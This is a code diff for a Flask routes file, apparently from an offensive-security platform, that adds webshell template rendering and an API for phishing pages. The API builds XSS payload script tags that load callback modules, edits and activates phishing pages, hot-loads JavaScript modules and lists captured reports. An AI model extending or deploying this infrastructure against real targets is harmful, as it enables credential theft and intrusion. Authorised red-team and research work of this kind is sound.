@@ -1,5 +1,6 @@
-"""C2 管理 + WebShell 管理路由。"""
+"""C2 管理 + WebShell 管理 + 钓鱼页面路由。"""
 import json
+import os
 import time
 from typing import Any, Dict
 
@@ -7,6 +8,7 @@ from flask import jsonify, render_template, request, Response
 
 from flowscan import c2_bridge
 from flowscan import webshell as ws
+from flowscan import phishing_bridge
 from flowscan.config import load_yaml
 
 from ._common import _to_bool, login_required
@@ -16,7 +18,16 @@ def _c2_config(config: Dict[str, Any]) -> Dict[str, Any]:
     cfg = config.get("c2", {}) or {}
     return {
         "enabled": _to_bool(cfg.get("enabled", False)),
-        "project_root": str(cfg.get("project_root", "/home/clay64/FlowScan/c2_server")),
+        "project_root": str(cfg.get("project_root", "")),
+        "config_file": str(cfg.get("config_file", "config.json")),
+    }
+
+
+def _phishing_config(config: Dict[str, Any]) -> Dict[str, Any]:
+    cfg = config.get("phishing", {}) or {}
+    return {
+        "enabled": _to_bool(cfg.get("enabled", False)),
+        "project_root": str(cfg.get("project_root", "phishing_server")),
         "config_file": str(cfg.get("config_file", "config.json")),
     }
 
@@ -49,11 +60,32 @@ def register(app):
     @login_required
     def c2_page():
         tab = request.args.get("tab", "c2")
-        if tab not in ("c2", "webshell"):
+        if tab not in ("c2", "webshell", "phishing", "xss"):
             tab = "c2"
         return render_template("c2.html", tab=tab)
 
     # ── WebShell 管理 ──
+
+    @app.route("/api/webshell/templates")
+    @login_required
+    def webshell_templates():
+        """模板库模块列表(目录即模块:webshell_templates/*)。"""
+        return jsonify({"ok": True, "templates": ws.list_templates()})
+
+    @app.route("/api/webshell/template/render", methods=["POST"])
+    @login_required
+    def webshell_template_render():
+        """渲染指定模板模块:POST {name, params:{pass, cmd_param, ...}}。"""
+        data = request.get_json(silent=True) or {}
+        name = (data.get("name") or "").strip()
+        params = data.get("params") or {}
+        if not name:
+            return jsonify({"ok": False, "error": "name is required"}), 400
+        code = ws.render_template(name, params)
+        if code is None:
+            return jsonify({"ok": False, "error": f"template not found: {name}"}), 404
+        return jsonify({"ok": True, "name": name, "code": code,
+                        "note": "执行协议 pass=<密码>&<命令参数名>=<命令>;上传后新建连接填入对应 URL/密码/命令参数名"})
 
     @app.route("/api/webshell/connections", methods=["GET", "POST"])
     @login_required
@@ -497,3 +529,261 @@ def register(app):
         ok, msg = c2_bridge.restart_c2()
         _c2_audit(app.config["get_redis"](), "restart c2", msg)
         return jsonify({"ok": ok, "message": msg})
+
+    # ════════════════════ 钓鱼页面 API(2026-08) ════════════════════
+
+    def _ph_audit(redis, line: str, output: str = "") -> None:
+        """钓鱼页面操作审计(独立 list,与 C2 审计分开)。"""
+        try:
+            entry = {
+                "ts": time.time(),
+                "ts_iso": time.strftime("%Y-%m-%d %H:%M:%S"),
+                "line": str(line or "")[:300],
+                "output_head": str(output or "")[:200],
+            }
+            redis.conn.rpush("fs3:phishing:audit", json.dumps(entry, ensure_ascii=False))
+            redis.conn.ltrim("fs3:phishing:audit", -1000, -1)
+        except Exception:
+            pass
+
+    def _ensure_phishing():
+        """启用检查 + 懒加载 + 回传挂载,返回 ph_cfg 或 None。"""
+        config = load_yaml(app.config["CONFIG_PATH"])
+        ph_cfg = _phishing_config(config)
+        if not ph_cfg["enabled"]:
+            return None
+        srv = phishing_bridge.init_from_flowscan_config()
+        if srv is None:
+            return None
+        phishing_bridge.attach_report_callback(app.config["get_redis"]())
+        return ph_cfg
+
+    @app.route("/api/phishing/status")
+    @login_required
+    def phishing_status():
+        if not _ensure_phishing():
+            return jsonify({"ok": False, "enabled": False,
+                            "error": "钓鱼页面未启用(config.yaml 设置 phishing.enabled: true)"})
+        return jsonify(phishing_bridge.status())
+
+    @app.route("/api/phishing/modules")
+    @login_required
+    def phishing_modules():
+        if not _ensure_phishing():
+            return jsonify({"ok": False, "error": "钓鱼页面未启用"}), 400
+        return jsonify({"ok": True, "modules": phishing_bridge.list_modules()})
+
+    @app.route("/api/phishing/module/<name>")
+    @login_required
+    def phishing_module_detail(name: str):
+        if not _ensure_phishing():
+            return jsonify({"ok": False, "error": "钓鱼页面未启用"}), 400
+        mod = phishing_bridge.get_module(name)
+        if not mod:
+            return jsonify({"ok": False, "error": "模块不存在"}), 404
+        return jsonify({"ok": True, "module": mod})
+
+    @app.route("/api/phishing/build", methods=["POST"])
+    @login_required
+    def phishing_build():
+        if not _ensure_phishing():
+            return jsonify({"ok": False, "error": "钓鱼页面未启用"}), 400
+        data = request.get_json(silent=True) or {}
+        name = str(data.get("name", "") or "").strip()
+        args = data.get("args") or {}
+        host = str(data.get("host", "") or "").strip()
+        if not isinstance(args, dict):
+            args = {}
+        res = phishing_bridge.build_payload(name, args, host=host)
+        if not res.get("ok"):
+            return jsonify({"ok": False, "error": res.get("error", "构建失败")}), 400
+        # xss_payload 模块额外返回注入代码:script tag 直接加载目标反连模块(args.module)
+        tag_res = None
+        if name == "xss_payload":
+            target = str(args.get("module") or "").strip() or "xss_payload"
+            tag_args = dict(args)
+            tag_args.pop("module", None)
+            tag_res = phishing_bridge.build_script_tag(target, tag_args, host=host)
+        return jsonify({"ok": True, "code": res["code"], "script_tag": (tag_res or {}).get("tag", "")})
+
+    @app.route("/api/phishing/pages")
+    @login_required
+    def phishing_pages():
+        if not _ensure_phishing():
+            return jsonify({"ok": False, "error": "钓鱼页面未启用"}), 400
+        pages = phishing_bridge.list_pages()
+        active = phishing_bridge.status().get("active_page", "")
+        return jsonify({"ok": True, "pages": pages, "active_page": active})
+
+    @app.route("/api/phishing/page/<name>/activate", methods=["POST"])
+    @login_required
+    def phishing_page_activate(name: str):
+        if not _ensure_phishing():
+            return jsonify({"ok": False, "error": "钓鱼页面未启用"}), 400
+        ok, msg = phishing_bridge.set_active_page(name)
+        _ph_audit(app.config["get_redis"](), f"page activate {name}", msg)
+        return jsonify({"ok": ok, "message": msg})
+
+    @app.route("/api/phishing/page/<name>/files")
+    @login_required
+    def phishing_page_files(name: str):
+        if not _ensure_phishing():
+            return jsonify({"ok": False, "error": "钓鱼页面未启用"}), 400
+        return jsonify({"ok": True, "files": phishing_bridge.list_page_files(name)})
+
+    @app.route("/api/phishing/page/<name>/file", methods=["GET", "POST"])
+    @login_required
+    def phishing_page_file(name: str):
+        if not _ensure_phishing():
+            return jsonify({"ok": False, "error": "钓鱼页面未启用"}), 400
+        if request.method == "GET":
+            file = str(request.args.get("path", "") or "").strip()
+            content = phishing_bridge.read_page_file(name, file)
+            if content is None:
+                return jsonify({"ok": False, "error": "文件不存在或类型不允许"}), 404
+            return jsonify({"ok": True, "path": file, "content": content})
+        data = request.get_json(silent=True) or {}
+        file = str(data.get("path", "") or "").strip()
+        content = str(data.get("content", "") or "")
+        ok, msg = phishing_bridge.write_page_file(name, file, content)
+        if ok:
+            _ph_audit(app.config["get_redis"](), f"page write {name}/{file}", msg)
+        return jsonify({"ok": ok, "message": msg})
+
+    @app.route("/api/phishing/page/create", methods=["POST"])
+    @login_required
+    def phishing_page_create():
+        if not _ensure_phishing():
+            return jsonify({"ok": False, "error": "钓鱼页面未启用"}), 400
+        data = request.get_json(silent=True) or {}
+        name = str(data.get("name", "") or "").strip()
+        desc = str(data.get("desc", "") or "").strip()
+        ok, msg = phishing_bridge.create_page(name, desc)
+        _ph_audit(app.config["get_redis"](), f"page create {name}", msg)
+        return jsonify({"ok": ok, "message": msg})
+
+    @app.route("/api/phishing/page/<name>", methods=["DELETE"])
+    @login_required
+    def phishing_page_delete(name: str):
+        if not _ensure_phishing():
+            return jsonify({"ok": False, "error": "钓鱼页面未启用"}), 400
+        ok, msg = phishing_bridge.delete_page(name)
+        _ph_audit(app.config["get_redis"](), f"page delete {name}", msg)
+        return jsonify({"ok": ok, "message": msg})
+
+    @app.route("/api/phishing/module/add", methods=["POST"])
+    @login_required
+    def phishing_module_add():
+        if not _ensure_phishing():
+            return jsonify({"ok": False, "error": "钓鱼页面未启用"}), 400
+        data = request.get_json(silent=True) or {}
+        filename = str(data.get("filename", "") or "").strip()
+        content = str(data.get("content", "") or "")
+        if not filename.endswith(".js"):
+            return jsonify({"ok": False, "error": "只允许 .js 模块文件"}), 400
+        if "// MODULE =" not in content:
+            return jsonify({"ok": False, "error": "模块内容必须包含 // MODULE = {...} 元数据头"}), 400
+        srv = phishing_bridge.get_phishing()
+        modules_dir = srv._loader._modules_dir if srv else None
+        if not modules_dir:
+            return jsonify({"ok": False, "error": "phishing 未启动"}), 400
+        path = os.path.join(modules_dir, filename)
+        try:
+            with open(path, "w", encoding="utf-8") as f:
+                f.write(content)
+            srv._loader.reload()
+        except OSError as exc:
+            return jsonify({"ok": False, "error": f"写入失败: {exc}"}), 400
+        _ph_audit(app.config["get_redis"](), f"module add {filename}", "ok")
+        return jsonify({"ok": True, "message": f"模块 {filename} 已写入并热加载"})
+
+    @app.route("/api/phishing/module/<filename>", methods=["DELETE"])
+    @login_required
+    def phishing_module_delete(filename: str):
+        if not _ensure_phishing():
+            return jsonify({"ok": False, "error": "钓鱼页面未启用"}), 400
+        if not filename.endswith(".js"):
+            return jsonify({"ok": False, "error": "只允许删除 .js 模块文件"}), 400
+        srv = phishing_bridge.get_phishing()
+        modules_dir = srv._loader._modules_dir if srv else None
+        if not modules_dir:
+            return jsonify({"ok": False, "error": "phishing 未启动"}), 400
+        path = os.path.join(modules_dir, filename)
+        if not os.path.isfile(path):
+            return jsonify({"ok": False, "error": f"模块 {filename} 不存在"}), 404
+        try:
+            os.remove(path)
+            srv._loader.reload()
+        except OSError as exc:
+            return jsonify({"ok": False, "error": f"删除失败: {exc}"}), 400
+        _ph_audit(app.config["get_redis"](), f"module delete {filename}", "ok")
+        return jsonify({"ok": True, "message": f"模块 {filename} 已删除并热生效"})
+
+    @app.route("/api/phishing/start", methods=["POST"])
+    @login_required
+    def phishing_start():
+        if not _ensure_phishing():
+            return jsonify({"ok": False, "error": "钓鱼页面未启用"}), 400
+        ok, msg = phishing_bridge.start()
+        _ph_audit(app.config["get_redis"](), "start", msg)
+        return jsonify({"ok": ok, "message": msg})
+
+    @app.route("/api/phishing/stop", methods=["POST"])
+    @login_required
+    def phishing_stop():
+        if not _ensure_phishing():
+            return jsonify({"ok": False, "error": "钓鱼页面未启用"}), 400
+        ok, msg = phishing_bridge.stop()
+        _ph_audit(app.config["get_redis"](), "stop", msg)
+        return jsonify({"ok": ok, "message": msg})
+
+    @app.route("/api/phishing/restart", methods=["POST"])
+    @login_required
+    def phishing_restart():
+        if not _ensure_phishing():
+            return jsonify({"ok": False, "error": "钓鱼页面未启用"}), 400
+        ok, msg = phishing_bridge.restart()
+        _ph_audit(app.config["get_redis"](), "restart", msg)
+        return jsonify({"ok": ok, "message": msg})
+
+    @app.route("/api/phishing/config", methods=["POST"])
+    @login_required
+    def phishing_config():
+        if not _ensure_phishing():
+            return jsonify({"ok": False, "error": "钓鱼页面未启用"}), 400
+        data = request.get_json(silent=True) or {}
+        ok, msg = phishing_bridge.update_config(data)
+        _ph_audit(app.config["get_redis"](), f"config {json.dumps(data)[:200]}", msg)
+        return jsonify({"ok": ok, "message": msg})
+
+    @app.route("/api/phishing/reports")
+    @login_required
+    def phishing_reports():
+        if not _ensure_phishing():
+            return jsonify({"ok": False, "error": "钓鱼页面未启用"}), 400
+        limit = min(int(request.args.get("limit", "100") or 100), 500)
+        reports = phishing_bridge.list_reports(limit)
+        return jsonify({"ok": True, "count": len(reports), "reports": reports})
+
+    @app.route("/api/phishing/reports/clear", methods=["POST"])
+    @login_required
+    def phishing_reports_clear():
+        if not _ensure_phishing():
+            return jsonify({"ok": False, "error": "钓鱼页面未启用"}), 400
+        ok, msg = phishing_bridge.clear_reports()
+        _ph_audit(app.config["get_redis"](), "reports clear", msg)
+        return jsonify({"ok": ok, "message": msg})
+
+    @app.route("/api/phishing/audit")
+    @login_required
+    def phishing_audit():
+        redis = app.config["get_redis"]()
+        limit = min(int(request.args.get("limit", "100") or 100), 500)
+        raw = redis.conn.lrange("fs3:phishing:audit", 0, limit - 1)
+        entries = []
+        for x in raw:
+            try:
+                entries.append(json.loads(x))
+            except Exception:
+                continue
+        return jsonify({"ok": True, "count": len(entries), "audit": entries})
